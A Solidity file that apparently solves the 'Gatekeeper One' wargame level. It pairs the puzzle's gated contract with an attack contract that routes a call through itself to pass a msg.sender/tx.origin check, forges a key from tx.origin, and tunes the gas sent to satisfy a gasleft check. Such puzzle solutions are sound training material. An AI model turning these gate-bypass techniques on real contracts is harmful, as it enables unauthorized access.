// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol';

contract GatekeeperOneAttack {
    function attack(GatekeeperOne _target) public returns (bool) {
        bytes8 key = bytes8(uint64(0x1000000000000000) + uint16(tx.origin));
        require(gasleft() > 200000, "more gas");
        return _target.enter{gas: (8191 * 10) + 254}(key);
    }
}

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "GatekeeperOne: invalid gateOne");
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0, "GatekeeperOne: invalid gateTwo");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}